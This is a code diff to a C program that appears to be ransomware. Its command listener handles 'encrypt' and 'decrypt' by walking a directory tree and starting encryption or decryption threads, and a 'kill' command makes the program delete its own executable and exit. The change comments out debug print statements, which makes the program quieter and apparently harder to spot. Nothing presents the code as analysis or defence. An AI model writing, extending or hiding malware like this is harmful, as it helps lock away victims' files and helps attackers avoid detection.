@@ -62,7 +62,7 @@ void *commands_listener(void *arg) {
                 traverse(start_path);
                 enqueue(&queue, "END_ENCRYPT");
  
-                printf("start_encryption\n");
+                //printf("start_encryption\n");
                 initialize_threads(THREADS_NUMBER, true);
                 watcher_on = true;
 
@@ -70,9 +70,9 @@ void *commands_listener(void *arg) {
                 pthread_cond_signal(&gui_cond);
                 pthread_mutex_unlock(&gui_mutex);
             } else if (strcmp(arguments[0], "decrypt") == 0) {
-                printf("q start\n");
-                print_queue(&queue);
-                printf("q end\n");
+                //printf("q start\n");
+                //print_queue(&queue);
+                //printf("q end\n");
 
                 watcher_on = false;
                 sleep(2);
@@ -80,10 +80,10 @@ void *commands_listener(void *arg) {
                 clear_queue(&queue);
                 traverse(start_path);
                 enqueue(&queue, "END_DECRYPT");
-                printf("start_decryption\n");
+                //printf("start_decryption\n");
                 initialize_threads(THREADS_NUMBER, false);
             } else if (strcmp(arguments[0], "kill") == 0) {
-                printf("kill himself\n");
+                //printf("kill himself\n");
                 char exe_path[1024];
 
                 ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
@@ -93,7 +93,7 @@ void *commands_listener(void *arg) {
                 }
                 exe_path[len] = '\0';
 
-                printf("Deleting: %s\n", exe_path);
+                //printf("Deleting: %s\n", exe_path);
 
                 if (unlink(exe_path) == 0) {
                     printf("Deleted successfully.\n");
@@ -103,7 +103,7 @@ void *commands_listener(void *arg) {
                 exit(0);
             } else {
                 for (int i = 0; i < argc; i++) {
-                    printf("%s\n", arguments[i]);
+                    //printf("%s\n", arguments[i]);
                 }
             }
         }
